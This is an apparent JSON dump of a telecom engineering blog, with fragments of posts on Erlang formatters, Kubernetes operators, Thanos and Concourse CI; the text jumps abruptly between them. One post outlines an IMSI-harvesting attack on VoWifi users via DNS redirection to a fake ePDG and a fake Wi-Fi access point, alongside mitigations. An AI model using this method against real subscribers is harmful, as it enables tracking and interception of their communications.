~/.cache/rebar3/`) as\\nexplained in [this issue](https://github.com/AdRoll/rebar3_format/issues/80)\\n\\nAfter installation you need to specify where the source files for\\nformatting can be found. This would probably not be needed if we did\\nnot use an Erlang umberella project (an umberella project is when\\nthere are subapplications residing in your main application).  Here is\\nwhere I found out that the command line option `--files\\napps/**/{src,include}/*.?rl` is apparantly not the same as specifying\\n`{format, [{files, [\u201capps/**/{src,include}/*.?rl\u201d]}]}` in the\\nconfig. The command line options finds only one file, while the config\\nparameter works as expected.\\n\\nFormatting-wise it is similar to `erl_tidy`. This is because it uses\\ninakas `katana_code` which in its turn uses `erl_tidy`.\\n\\n\\n```diff\\n-           components =\\n-               [{invoke,\\n-                 #\'Invoke\'{\\n-                    invokeID = 1,linkedID = asn1_NOVALUE,\\n-                    operationCode = updateLocation,\\n-                    parameter =\\n-                        #\'UpdateLocationArg\'{\\n-                           imsi = IMSI,\\n-                           \'msc-Number\' = CallingGTBCD,\\n-                           \'vlr-Number\' = CallingGTBCD}}}]},\\n+                                      components =\\n+                                          [{invoke,\\n+                                            #\'Invoke\'{invokeID = 1,\\n+                                                      linkedID =\\n+                                                          asn1_NOVALUE,\\n+                                                      operationCode =\\n+                                                          updateLocation,\\n+                                                      parameter =\\n+                                                          #\'UpdateLocationArg\'{imsi\\n+                                                                                   =\\n+                                                                                   IMSI,\\n+                                                                               \'msc-Number\'\\n+                                                                                   =\\n+                                                                                   CallingGTBCD,\\n+                                                                               \'vlr-Number\'\\n+                                                                                   =\\n+                                                                                   CallingGTBCD}}}]},\\n```\\n\\nProblem is that both `erl_tidy` and `katana_code` have multiple issues\\nwith macros.

Linters can also check other things as nesting level.\\n\\nThis article by Brujo Benavides describe it pretty well.\\n\\n[Are formatters better than linters?](https://medium.com/@elbrujohalcon/are-formatters-better-than-linters-cbab91189be3)\\n\\nSetting it up you need to configure a ruleset and save in a special\\nElvis config file in the repo.

There are issues with macros, or execution time.\\n\\nI have to put this on the shelf again for a while, with just a dream\\nof uniform code.\\n\\n# Edit: 2020-10-01\\n\\nI forgot to update this blogpost, but something amazing happend.\\n\\nAfter I wrote this blog post I contacted the maintainer of\\nsteamroller, and told him about the slowness I experienced, and some\\nother difficulties.  One day later he had found and fixed an algorithm\\ngoing from an `O(n^2)` complexity to an `O(n)`. When retrying it on our\\ncode base, things went from minutes to seconds!\\n\\nHe also removed and improved some of the ambiguous configuration\\nparameters.\\n\\nI haven\'t yet started to look at the map formatting issues I had, but\\nmaybe that is improved as well.

One of\\nthe services has really have gained traction later years is VoLTE (Voice\\nover LTE) and VoWifi (Voice over Wifi) that we will go more in dept regarding security.\\n\\n\x3c!--truncate--\x3e\\n\\nVoWifi is beneficial in terms being able to use any Wifi connection offering public\\ninternet access thus extending and improving the coverage and connectivity.\\nThink of it as building our own cellular network, but\\nusing commodity wifi components instead and avoiding the strict regulation and\\nlicensing of spectrum.\\n\\n## What is IMSI\\n*The international mobile subscriber identity (IMSI) is a number that uniquely\\nidentifies every user of a cellular network. It is stored as a 64-bit field\\nand is sent by the mobile device to the network. It is also used for acquiring\\nother details of the mobile in the home location register (HLR) or as locally\\ncopied in the visitor location register. To prevent eavesdroppers from\\nidentifying and tracking the subscriber on the radio interface, the IMSI is sent\\nas rarely as possible and a randomly-generated TMSI is sent instead.*\\n\\n* [IMSI article](https://en.wikipedia.org/wiki/International_mobile_subscriber_identity)\\n\\n### Security implications\\nThe IMSI is a secret identifier stored on the sim and can be exploited in many\\nways once known. It is bound to the sim, so changing UE will not help.\\n\\nExamples:\\n* Locating user (UE)\\n* Intercepting calls\\n* Intercepting SMS (stealing two factor pin eg.)\\n* ..and more\\n\\n## How VoWifi works\\nWhen your phone is connected to datanetwork and with volte and vowifi enabled\\nthe device (UE) establish sip session directly to packetgateway via 4g, and via\\npublic internet to epdg (evolved packet data gateway) which is in essence a\\nipsec (ikev2) termination using SIM-AKA to authenticate UE. The ipsec comes into\\nplay since epdg is exposed publicly.\\n\\nWe won\'t go further in depth for volte and vowifi since there are already\\nexcellent articles about the matter:\\n* [Voice over WLAN](https://en.wikipedia.org/wiki/Voice_over_WLAN)\\n* [Voice over LTE](https://en.wikipedia.org/wiki/Voice_over_LTE)\\n\\n![VoWifi topology](/img/blog/vowifi-imsi-leak/vowifi.jpg)\\n\\nTo enable VoWifi on your device, please refer to your device manufacturer website:\\n\\n* [Android](https://support.google.com/phoneapp/answer/2811843?hl=en)\\n* [Apple](https://support.apple.com/en-in/HT203032)\\n\\nAlso check on your operator website if VoWifi is supported in your region. Please note that VoWifi is usually blocked when roaming.\\n\\n\\n## EPDG exposed on the public internet\\nThe Evolved Packet Data Gateway needs to be publicly available on the internet\\nsince UE needs to access it from an arbitrary no-trusted connection. The ipsec\\nwill secure and encrypt both the data and maintain the integrity of the\\nconnection throughout the session.\\n\\nThe UE finds the epdg termination point by looking dns records partly following\\na convention decided by 3gpp and typically looks like this in DNS:\\n\\n```\\nepdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 1.2.3.4\\nepdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 5.6.7.8\\n```\\n\\nFrom the DNS records we recognize the network operator (MNC) and the\\ncountry code (MCC).\\n\\nThe DNS records are registered under a delegated domain owned by GSMA and\\nusually are redelegated to operator under their own umbrella, like the example\\nmnc999.mcc999.pub.3gppnetwork.org.\\n\\n## The problem\\nWhen UE establish session to epdg it uses a vpn, a ipsec relationship using\\nIKEv2 for authentication, encryption and integrity.\\n\\nSo far the implementation works as intended and provides good security through\\nencryption and security.\\n\\nThe problem is not the VoWifi per see, by rather how ipsec establish the\\nsession. When UE connects to the epdg, it acts as a initiator and the epdg is\\ninherently passive since it cannot know where from (ip) the UE will come from.\\n\\n![sim-aka flow](/img/blog/vowifi-imsi-leak/sim-aka.png)\\n\\n### EAP-AKA exposes identity\\nVowifi as mentioned earlier utilises an encryption protocol based on the widely\\nadopted Extensible Authentication Protocol. EAP itself is just a protocol and\\ndoes not define the contents of the data or how exact the data exchanges look\\nlike. EAP-AKA unfortunately exposes the unencrypted user identity during\\nthe authentication session and in this case the user identity is equal to the\\nimsi.\\n\\n#### Solution\\nThis is the hardest problem to solve since it needs a security layer or settings\\nthat comes before ipsec starts to connect.\\n\\nThe proposed solutions\\n* Force the use of conservative peer for eap-aka/sim\\nand use pseudonym identity (tmsi) to avoid exposing imsi.\\n* Enable EAP-TTLS in addition to EAP-AKA/SIM\\n* Only connect trusted/encrypted AP\'s\\n\\n### Fake Ipsec termination exposes identity\\nBy impersonating a epdg by redirecting all dns requests for any\\n`pub.3gppnetwork.org.` to our own fake ipsec termination providing just enough\\nto catch the imsi.\\n\\nA raspberry pie can easily be setup to constantly scan for open wifi networks,\\nthen impersonating the ssid in hope of lure ue\'s to connect. Any UE set to use\\nVoWiFi connecting to the fake access point will give away their imsi.\\n\\nA wifi ssid scan example of what we can automate.

However we have a\\nfew cases where we need to do some additional work.\\n\\n\x3c!--truncate--\x3e\\n\\nOne case for example is that we have to use static IPs for some of our services to connect to\\nTelecom companies as they expect a single IP address to bind to. This address needs to be fixed and\\nDNS records are not accepted either. We are running in AWS as well, so the reader might ask why are we not\\nusing Elastic IPs and adding them to the services? Good idea, but Telecom operators will not whitelist\\nan Elastic IP for you as there are no guarantees that it will belong to your company infrastructure forever. There\\nare also additional challenges when it comes to using Elastic IP in private subnet over VPN or direct connect.\\n\\nWe are a member of RIPE and do have a small subnet block for our own use, so we thought we could make use of\\nthat. As we own the block and AWS supports BYOIP (Bring your own IP-range), we created a special subnet with\\nsome Kubernetes nodes in it. This was not enough to make this work since we depended on a service always having\\nthe same IP attached to it, as well as the node running a pod having some very specific Routes set.\\n\\nWith this scenario in mind we set out to find solutions and all solutions we could think of required haggling\\nwith Kubernetes.\\n\\n## Extending Kubernetes\\n\\nThere are several ways to extend Kubernetes. All functionality in Kubernetes is build upon very nice and clean\\npublic APIs, or to say it with other words: There is no private API magic hidden somewhere. So lets look at\\ntwo ways on how to extend Kubernetes.\\n\\nPossible ways to go forward:\\n- Adding a scheduler extender\\n- Creating an operator/controller\\n\\nThere are more ways to extend Kubernetes, but these two ways will be the one we shall look at. Just for completeness\\nyou can as well also add another scheduler or change Kubernetes itself. However these possibilities have some serious\\ndownsides.\\n\\n### Adding a scheduler extender\\nThe Kubernetes scheduler checks for certain requirements before it schedules a pod onto a node. Some of these requirements\\nare hard requirements, like cpu, memory and number of pods. Other requirements are more soft, like if the pods are allowed to\\nbe packed together or in which AZ they are going to run. All of those requirements are collected and points given to each\\nnode on how well they meet the requirements. The node that fits best, gets chosen.\\n\\nAll of these are things the scheduler will do for you automatically, however it is also possible to give the cluster a\\n`KubeSchedulerConfiguration` object that will tell the scheduler to also reach out to a service for additional point scoring.\\nThe SchedulerConfiguration is a JSON file and for further explanations, please have a look at this\\nexcellent [blog post](https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/).\\n\\nIn our case, we could have written a service that checks which IP Addresses are assigned to the Nodes and moved the Pods\\nonto those nodes. This would have required us to make sure that those nodes had all needed IP-Addresses all the time.\\nThat sounded not very enticing when doing cluster upgrades as it would have needed to be at least a semi-manual process.\\nSo we decided against this approach.\\n\\n### Creating an operator\\nAn Operator/Controller on the other hand is a component observing resources and then try to create the declared resources.\\nThe difference between a controller and an operator is basically that an operator is handling the lifecycle of an\\napplication, whereas a controller may control specific resources that are not associated with a specific application.\\nThey both use the controller pattern though and both can be implemented with the same toolset, so for simplicity sake in the\\ncontext of this article, we will consider them to be equal.\\n\\nOperators usually consists at least out of a **[CRD(CustomResourceDefinition)][2]**, an **event listener** and a **reconciliation loop**.\\nThe *CRD* basically creates a new type of resource and effectively implements a domain specific language for the operator. The whole description on what this deployment\\nneeds to look like and all its abilities need to be defined in the *CRD*. The operator will create an *event listener* for that\\n*CRD* as the primary resource and additional *event listeners* for the secondary resource (most likely pods in this example).\\nThe *event listener* will let the *reconciliation loop* know once a [CRUD][3] operation has been requested on either the primary or\\nsecondary resource. The *loop* will then try to bring the *CRD* into the desired state, depending on what operation has been\\nrequested. So in the Redis example it will either create the pods, update the pods, in the case of an upgrade it might blue/green\\ndeploy the pods or delete the pods. Basically things a human operator would do in this case, just in programmatic form, taking it\\nfrom a declarative form into existing resources.\\n\\nAs our initial problem was making services available on static IP addresses, we chose to explore this approach further,\\nbasically attaching additional IP addresses to the nodes running specific pods.\\n\\n## Building an Operator/Controller\\nFor building an operator, there are several frameworks out there, but we will only look at the [operator-framework](https://github.com/operator-framework/operator-sdk) in\\nthis article.\\n\\n### Operator-SDK\\nThe Operator framework is a project that is designed to help you get started on creating an operator. To achieve that,\\nit will generate quite a bit of boilerplate.\\n\\nThe Operator-SDK supports three different models of creating an operator:\\n- Helm\\n- Ansible\\n- Golang\\n\\nDepending on your choice of tool, you will be able to integrate deeper into Kubernetes or not.\\n\\n![operator-sdk-capabilites](/img/blog/operator/operator-capability-level.png \\"Operator sdk capabilities (Taken from the operator-sdk repo)\\")\\n*[Operator sdk capabilities][1]*\\n\\nAs we didn\'t want to be limited by our choice later on and wanted to expose metrics from our operator, we chose to\\nimplement our operator in golang. We will be using the operator-sdk version 0.12 for this.\\n\\n### What we want to do\\nLooking at the problem again, we need some way to make sure that a node that runs a specific pod, needs to\\nhave an IP address attached to it. This IP address will be given to connecting parties as a entry point to our\\nsystem and thus cannot change.\\n\\nFeatures it needs to support\\n- Reserve IP address from range\\n- Attach IP address to node running pod\\n- Detach IP address from node that is not running pod\\n- Move IP addresses around in case of node failure\\n\\nThis feature list already shows some things we will not and most likely cannot support. For example autoscaling of\\nreplica sets will not work as an IP address is bound to a node with an assigned pod. There is\\na 1-1 association here. However it is still possible to use the self-healing properties of Deployments\\nin this case.\\n\\nWhen thinking about modelling this behaviour, we basically decided on the following approach:\\n- Create a IP kind (for reserving the IP Address in the Range)\\n- Use annotations to attach the IP Address to a pod\\n\\nWe also thought about creating a StaticIPDeployment kind, but at the end decided against it, as\\nwe feared that the lifecycle management would be way more complicated if we needed to manage a deployment\\ninstead of just controlling the assignment of an IP Address.\\n\\nAfter all this is the first Operator we are going to write and didn\'t want to drown in complexity from day one.\\nWe would rather iterate and scrap everything after we tried it, then going too complex from the start.\\n\\n\\n### Implementation\\n\\nThe first thing you do when starting off a new operator, is that you initialize the directory of your\\noperator with the following command:\\n\\n```\\noperator-sdk new app-operator --repo <YOURREPO>\\n```\\n\\nThis will create some boilerplate folders and files for you and will look roughly like this:\\n\\n![operator-fs-structure](/img/blog/operator/operator-structure.png \\"Operator Folder Structure\\")\\n\\nThe next thing you might want to do is then add the boilerplate for a CRD and a Controller:\\n\\n```\\noperator-sdk add api --api-version=ip.wgtwo.com/v1alpha1 --kind=IP\\noperator-sdk add controller --api-version=ip.wgtwo.com/v1alpha1 --kind=IP\\n```\\n\\nAfter creating the boilerplate, your folder structure will look a lot like this:\\n\\n![operator-fs-structure-expanded](/img/blog/operator/operator-structure-expanded.png \\"Operator Folder Structure Expanded\\")\\n\\nThe most important files right now are in:\\n- cmd/manager/main.go (the main program that will run in the cluster)\\n- pkg/apis/ip/v1alpha1/ip_types.go (definition of the CRD)\\n- pkg/controller/ip_controller.go (event listener and reconciliation loop)\\n\\n#### Creating the CRD\\n\\nTo start off, we define how our CRD should look like to be able to manage our IP Address. We do this,\\nby creating structs in go that have all the fields our CRD shall have. This includes metadata, \\"spec\\" and\\n\\"status\\" fields.\\n\\nThere is also a bit of operator-sdk specific code we need to add. This is so that the sdk can generate the\\nopenapi spec and other auto-generated code.\\n\\n```\\n// +k8s:openapi-gen=true\\n// +kubebuilder:subresource:status\\n// +kubebuilder:resource:path=ips,scope=Cluster\\ntype IP struct {\\n\\tmetav1.TypeMeta   `json:\\",inline\\"`\\n\\tmetav1.ObjectMeta `json:\\"metadata,omitempty\\"`\\n\\n\\tSpec   IPSpec   `json:\\"spec,omitempty\\"`\\n\\tStatus IPStatus `json:\\"status,omitempty\\"`\\n}\\n```\\n\\nThe \\"spec\\" needs to contain all information the controller needs to create the resource.\\nThe \\"status\\" part needs to contain all the bookkeeping information the controller needs to work. In a way the\\n\\"status\\" fields are used as a database for operating Kubernetes (yes, this is oversimplified).\\n\\n```\\n// +k8s:openapi-gen=true\\ntype IPSpec struct {\\n\\tAddress string `json:\\"address\\"`\\n\\tReassign bool `json:\\"reassign,omitempty\\"`\\n}\\n\\n// IPStatus defines the observed state of IP\\n// +k8s:openapi-gen=true\\ntype IPStatus struct {\\n\\tAssigned bool   `json:\\"assigned\\"`\\n\\tClaimed  bool   `json:\\"claimed\\"`\\n\\tNode     string `json:\\"node,omitempty\\"`\\n\\tPod      string `json:\\"pod,omitempty\\"`\\n\\tOriginal IPSpec `json:\\"original,omitempty\\"`\\n}\\n```\\n\\nAs you can see our new IP Resource type, as defined by the CRD that we are gonna create from these structs, is\\ngoing to have two fields: \\"Address\\" and \\"Reassign\\".\\nThe corresponding \\"status\\" part of the resource, has a lot more fields, which we are using for bookkeeping.\\n\\nAfter we have created those structs and know how the CRD needs to look like, we actually auto-generate the CRD yaml:\\n```\\noperator-sdk generate k8s\\noperator-sdk generate openapi\\n```\\nNB: This changed since operator-sdk 0.15\\n\\n#### Creating the controller\\n\\nThere are two main parts to the controller. One part that creates a watcher on resources and one part\\nthat reconciles your resource (in our case the IP and Pods).\\n\\n##### Watching for resource changes\\nThe watch code is in our case in the `add` function of ip_controller.go:\\n```\\n\\t// Watch for changes to primary resource IP, as this always requires an action\\n\\terr = c.Watch(&source.Kind{Type: &ipv1alpha1.IP{}}, &handler.EnqueueRequestForObject{})\\n\\tif err != nil {\\n\\t\\treturn err\\n\\t}\\n\\n\\t// Create Filter list triggering on ip.wgtwo.com/ip as annotation\\n\\tpred := predicate.Funcs{\\n\\t\\t// Ignore the pod if it does not contain annotation ip.wgtwo.com/ip\\n\\t\\tCreateFunc: func(e event.CreateEvent) bool {\\n\\t\\t\\treturn hasAnnotation(e.Meta)\\n\\t\\t},\\n\\t\\tUpdateFunc: func(e event.UpdateEvent) bool {\\n\\t\\t\\tif hasAnnotation(e.MetaOld) || hasAnnotation(e.MetaNew){\\n\\t\\t\\t\\treturn true\\n\\t\\t\\t} else {\\n\\t\\t\\t\\treturn false\\n\\t\\t\\t}\\n\\t\\t},\\n\\t\\tDeleteFunc: func(e event.DeleteEvent) bool {\\n\\t\\t\\t// Evaluates to false if the object has been confirmed deleted.\\n\\t\\t\\treturn !e.DeleteStateUnknown\\n\\t\\t},\\n\\t}\\n\\t// Watch for all pods having the right annotation\\n\\terr = c.Watch(&source.Kind{Type: &corev1.Pod{}}, &handler.EnqueueRequestForObject{}, pred)\\n```\\nHere we are creating watchers for all changes to the `IP` resource and watchers for all create/update/delete operations on\\npods, if they have a specific annotation set.\\n\\nIf any of these conditions are met, the reconciliation loop will be triggered.\\n\\n##### Reconciliation\\n\\nThis is where the business logic of your operator/controller is sitting. The `Reconcile` function in `ip_controller.go` will\\nbe triggered whenever one of the watch conditions fits.\\nWe do not know which type of resource triggered the loop, so that is the first thing we need to figure out:\\n```\\noip := &ipv1alpha1.IP{}\\nerr := r.client.Get(context.TODO(), request.NamespacedName, oip)\\nif err == nil {\\n    ... yes it is a resource of kind IP ... go and do business\\n}\\n...\\nop := &corev1.Pod{}\\nerr = r.client.Get(context.TODO(), request.NamespacedName, op)\\nif err == nil {\\n    ... yes it is a resource of kind Pod ... go and do business\\n}\\n...\\n```\\n\\nIn these two code blocks, we are handling all the interactions for the primary resource of kind IP and the secondary\\nresource of type pod. Depending on what has happened last we have different scenarios.\\n\\nCases for the IP resource to consider:\\n- IP is new\\n- IP has been modified\\n- IP has been deleted\\n\\nCases for the Pod resource to consider:\\n- Annotation sticking the IP to the pod has been deleted\\n- IP needs to be assigned to a pod\\n- Pod has moved to another node\\n- Pod has been deleted\\n\\nWe will not go any further into the detail on what these parts are actually doing, as this is enough\\nto actually give you an idea on how this can be accomplished.\\n\\n\\n## Summary\\n\\nWe have been looking at how to expand Kubernetes to suit our needs better. Creating the Operator/Controller\\nhas taught us quite a bit about how Kubernetes works and has already saved us work in the past\\nfew months, especially on node failures.\\n\\nThe operator-sdk has been a great tool for us to solve this problem and we see that there is a lot of work\\ngoing into it, making it simpler to create operators. It might look intimidating at first, but is worth the effort and\\nwe think in the future Kubernetes operators will be the way how stateful components will be managed.\\n\\n\\n## Resources / Further Reading\\n\\n- Programming Kubernetes by Stefan Schimanski and Michael Hausenblas\\n- [Creating a custom kube-scheduler](https://developer.ibm.com/articles/creating-a-custom-kube-scheduler/)\\n- [Operator SDK](https://github.com/operator-framework/operator-sdk)\\n\\n[1]: https://github.com/operator-framework/operator-sdk/blob/master/README.md\\n[2]: https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/\\n[3]: https://en.wikipedia.org/wiki/Create,_read,_update_and_delete"},{"id":"metrics-unlimited-thanos","metadata":{"permalink":"/jp/blog/metrics-unlimited-thanos","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-01-28-Thanos-infinite-metrics.md","source":"@site/../blog/2020-01-28-Thanos-infinite-metrics.md","title":"Towards observability nirvana: infinite metric retention with Thanos","description":"In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and","date":"2020-01-28T00:00:00.000Z","formattedDate":"January 28, 2020","tags":[{"label":"infrastructure","permalink":"/jp/blog/tags/infrastructure"},{"label":"observability","permalink":"/jp/blog/tags/observability"},{"label":"prometheus","permalink":"/jp/blog/tags/prometheus"},{"label":"thanos","permalink":"/jp/blog/tags/thanos"},{"label":"kubernetes","permalink":"/jp/blog/tags/kubernetes"}],"readingTime":5.055,"hasTruncateMarker":true,"authors":[{"name":"Holger Ihrig","title":"Software Engineer for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/hihrig/","imageURL":"/img/author-photos/hi.jpg","key":"holger-ihrig"}],"frontMatter":{"slug":"metrics-unlimited-thanos","title":"Towards observability nirvana: infinite metric retention with Thanos","date":"2020-01-28T00:00:00.000Z","tags":["infrastructure","observability","prometheus","thanos","kubernetes"],"authors":"holger-ihrig"},"prevItem":{"title":"Extending Kubernetes for our needs","permalink":"/jp/blog/extending-k8s/"},"nextItem":{"title":"We killed the butler: Replacing Jenkins with Concourse","permalink":"/jp/blog/replacing-jenkins-with-concourse"}},"content":"In the current DevOps world, our industry relies on the ability to observe and monitorize our infrastructure and\\nservices. **wgtwo** is no exception here and as we are operating in the TelCo space\\nwe wanted to know more about the usage patterns of our platform over days, months and even years.\\n\\n\x3c!--truncate--\x3e\\n\\nInternally we have been running Prometheus for a long time with a fairly limited retention of 30 days.

For readability we\\nwill only refer to it as S3 Storage as this is our storage target.\\n\\nWe shall briefly look at all those components before describing how we are leveraging Thanos to obtain a higher metric\\nretention and higher reliability.\\n\\n### Thanos Sidecar\\nThe Sidecar runs as the name suggests in the same pod as Prometheus and observes when Prometheus saves new storage\\nbuckets on disk, which it does about every 2 hours. If configured to do so, it will upload those storage bucket into S3.\\nAnother important feature is that it extends the Prometheus Pod with an API that can be used by Thanos Querier\\nas a Store API endpoint to query Prometheus metrics.\\n\\n### Thanos Store\\nThanos Store implements the Thanos Store API and makes the metric data stored in the S3 bucket available to the\\nThanos Querier. To do that it observes the configured S3 Bucket and reads the metadata of the stored storage buckets\\navailable in S3.\\n\\n### Thanos Querier\\nQuerier implements the Prometheus Query API and understands PromQL. It then sends the query using the aforementioned\\nStore API to all known Thanos Stores (discovered using service discovery) and awaits the metric information from the\\nstores, be it directly from Prometheus via the sidecar or metrics stored in S3 Object storage via Thanos Store.\\n\\n### Thanos Compactor\\nIt does not make a lot of sense to keep old metrics that are scraped every 15 or 30 seconds forever. At some point these\\nmetrics would no longer be useful to make sense of your metrics. This is where\\nthe Thanos Compactor comes in. It creates aggregates of old metrics based on rules. It will for example\\naggregate metrics that are older than 30 days into 5 minute chunks. This saves resources and still gives you\\nalmost the same accuracy when looking at longer timespans. After those metrics have been aggregated, they are\\nwritten back into the S3 bucket and the metadata gets updated.\\n\\n### Thanos Ruler\\nThe Ruler component is the Thanos equivalent of Recording Rules. It can look at all Store APIs and generate new metrics\\naccording to the Recording Rules fed into the Ruler component. However since this rule processing is not done against a\\nlocal datastore, it is possible that these new metric datapoints will not always be generated as it relies on a reliable\\ndata source to do this in the required intervals.\\n\\n## Architecture in a Cluster\\n\\n![Thanos Architecture](/img/blog/thanos/thanos_architecture.png)\\n\\nAs we can see, there are quite a few things going on in this architectural view of the system, but on the other hand it\\nis fairly simple to understand as the components are nicely decoupled from each other.\\n\\nAn interesting thing here is that the drawing has multiple Prometheus instances with multiple sidecars. Thanos actually\\nallows for deduplication of timeseries data. The data uploaded from the sidecars contains information about which prometheus\\ninstance the metrics are generated from, and adds that. The Querier can then deduplicate this data so that the metrics shown\\nin Grafana are consistent and do not come sometimes from Prometheus A and sometimes from Prometheus B.\\n\\nThis design also allows for an interesting other Use Case: querying multiple clusters. As\\nlong as the storage location used by the sidecars for uploading the metrics is identical, the time series data is\\navailable to the Thanos Store and therefor the Querier and Grafana.\\nThat even allows to run Grafana, Querier and Store in a completely different part of the world if need be.\\n\\n## Is it worth it?\\n\\n### Pros\\n- highly available Prometheus\\n- increased reliability (decoupled query component)\\n- infinite metric storage\\n- query multiple clusters from a single point\\n- easy to scale\\n\\n### Cons\\n- more complex architecture\\n- increased resource usage\\n\\n## What are the biggest benefits for us?\\n\\nAs stated in the beginning of this article one of our objectives for implementing Thanos was the increased\\nmetric retention to be able to look back further in time.\\n\\nThe most interesting features for us are to be able to:\\n- analyze trends and identify anomalies within the mobile core network\\n- visualize and graph service usage\\n- predict service usage on peak days (think New Years Eve)\\n- observe behaviour over multiple deployments (regions, customers and cloud providers)\\n\\n## Summary\\n\\nEven though Thanos comes with an increased architectural and operational complexity, we have to say after running it for a while, we think it is totally worth it. We can make architecture decisions by looking further\\nback in time than before. It also has the additional advantage that a misconfiguration of a Prometheus deployment\\ndoes not pull down the whole stack as Prometheus is HA and only updates one at a time. If the deployment fails,\\nwe can get notified and the deployment can be aborted. Also upgrades of the whole monitoring stack, can\\nnow be done gradually, which is also a great advantage for us!"},{"id":"replacing-jenkins-with-concourse","metadata":{"permalink":"/jp/blog/replacing-jenkins-with-concourse","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2019-12-20-jenkins-to-concourse.md","source":"@site/../blog/2019-12-20-jenkins-to-concourse.md","title":"We killed the butler: Replacing Jenkins with Concourse","description":"At wgtwo, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:","date":"2019-12-20T00:00:00.000Z","formattedDate":"December 20, 2019","tags":[{"label":"infrastructure","permalink":"/jp/blog/tags/infrastructure"},{"label":"CICD","permalink":"/jp/blog/tags/cicd"},{"label":"devops","permalink":"/jp/blog/tags/devops"}],"readingTime":5.11,"hasTruncateMarker":true,"authors":[{"name":"Anna Kennedy","title":"Tech Lead for Cloud and Edge Infrastructure","url":"https://www.linkedin.com/in/annaken","imageURL":"/img/author-photos/ak.jpg","key":"anna-kennedy"}],"frontMatter":{"slug":"replacing-jenkins-with-concourse","title":"We killed the butler: Replacing Jenkins with Concourse","date":"2019-12-20T00:00:00.000Z","tags":["infrastructure","CICD","devops"],"authors":"anna-kennedy"},"prevItem":{"title":"Towards observability nirvana: infinite metric retention with Thanos","permalink":"/jp/blog/metrics-unlimited-thanos"},"nextItem":{"title":"Hacking dark themes with CSS blend modes","permalink":"/jp/blog/hacking-dark-themes-with-css-blend-modes/"}},"content":"At **wgtwo**, we try to use CI/CD pipelines to automate all of our repetitive tasks when it comes to code and infrastructure deployment and testing, such as:\\n\\n\x3c!--truncate--\x3e\\n\\n* running unit tests on each pull request\\n* building and running integration tests with bazel on every merge to the monorepo\\n* building container images and upload them to the registry\\n* scanning all images for security flaws\\n* running acceptance tests in the staging environment\\n* syncing secrets between different sources\\n* notifying slack if changes are made in Kubernetes\\n\\nWe had been using [Jenkins](https://jenkins.io/) to run such pipelines, but having to configure it by navigating a web GUI made it difficult to maintain, redeploy, and upgrade, so we decided to look for alternatives.\\n\\n![Jenkins](/img/blog/jenkins-to-concourse/jenkins.png)\\n\\nThe majority of our code lives in a monorepo, and we use Bazel to manage builds and tests.\\nWe try to do all of our infrastructure configuration via [gitops](https://www.gitops.tech/) so it was important that a continuous integration and deployment system not only play nicely with our existing structures, but be itself configurable from code.\\n\\nWe spent time investigating other options, and eventually settled on **[Concourse](https://concourse-ci.org/), a cloud-native CI/CD server where tasks are deployed in containers, and config is stored as yaml**.\\n\\n\\n## Infrastructure as code\\n\\nWe run Concourse in Kubernetes, so the setup and configuration itself is all done with yaml files and kubectl. It\'s fast and easy to upgrade and redeploy.\\n\\nWithin Concourse, the pipeline configuration is entirely yaml-based; there are no buttons in the UI except for an abort/re-run button.\\n\\n```\\njobs:\\n- name: run-acceptance-tests-staging\\n  plan:\\n  - task: run-tests\\n    config:\\n      inputs:\\n      - name: monorepo\\n      run:\\n        path: /bin/bash -c runtests.sh\\n    on_failure:\\n      put: notify-slack-ci\\n```\\n\\n![Concourse task](/img/blog/jenkins-to-concourse/concourse_task.png)\\n\\nPipelines are made up of jobs that run in series or parallel; jobs consist of tasks.\\nPipelines, jobs and tasks are described in code and automatically visualised in the UI.\\nChanges to pipelines are applied by updating the yaml file and running Concourse\'s [fly cli](https://concourse-ci.org/fly.html) tool.\\n\\n\\n## Containerised deployment\\n\\nConcourse runs every job in its own container, which means that every job uses an entirely clean, reproducible environment. Any dependencies required for a task can be pre-installed in the image.\\nThis is a huge improvement for us over Jenkins, where dependencies were installed to the entire worker node, and artifacts from previous builds were left lying about on the server.\\n\\nWe use docker containers, and we also run Concourse itself as a container, which means a bit of docker-in-docker magic.\\nIt look a little work to build an image we were happy with, but beyond that it went surprisingly smoothly for us on the whole.\\nThe only drawback is that we have to run images in privileged mode, but in our self-managed Kubernetes cluster this isn\'t really too much of an issue.\\n\\nThere were some challenges in figuring out what resources needed to be allocated; we settled on three worker nodes and a maximum of 2 active tasks per worker. We see a little bit of slowness some afternoons when the pull-requests are coming thick and fast, but the cluster remains stable. It would be nice to set some autoscaling here to cope with short-term peaks in load.\\n\\n![Concourse pipeline](/img/blog/jenkins-to-concourse/concourse_pipeline.png)\\n\\n\\n## Debugging\\n\\nSince the tasks all run in containers, it\'s easy to debug issues locally by running the same image on the laptop as is running in Concourse.\\nAlternatively, the [fly execute](https://concourse-ci.org/tasks.html#running-tasks) cli tool runs a local project in a container in Concourse, a nice interim step when trying to get a deploy working.\\n\\nThe [fly intercept](https://concourse-ci.org/builds.html#fly-intercept) tool offers a way to log into a running container in concourse to troubleshoot:\\n\\n```\\n$ fly intercept -j ecs-services\\n1: build #27, step: monorepo, type: get\\n2: build #27, step: notify-slack-ci, type: get\\n3: build #27, step: notify-slack-ci, type: put\\n4: build #27, step: run-acceptance-tests-staging, type: task\\nchoose a container: 4\\nroot@02f69d15-b7be-4f2e-43f7-24f549071bb1:/tmp/build/3a58ea39#\\n\\n```\\n\\n## Resource types and extending Concourse\\n\\nThere are a large number of [resource types](https://github.com/concourse/concourse/wiki/Resource-Types) available for Concourse, making it fairly straightforwards to configure pipelines.\\n\\nAs resource types in Concourse are all based on containers, extending Concourse means introducing a new container that can be called from Concourse.\\n\\nA resource type needs to implement the following executables/scripts:\\n\\n* check (checking new versions of the resource, eg. is there a new pull request)\\n* in (pulling a new version of the resource down, eg. download code from a pull request)\\n* out (pushing a new version of the resource up, eg. push a build result to Github)\\n\\nThese binaries need to be placed under /opt/resource in the docker container.\\nConcourse calls these binaries with JSON payload and optional parameters that can all be found [here](https://concourse-ci.org/implementing-resource-types.html).\\nWhat is done in those executables/scripts is up to the implementer, but it is really easy to extend 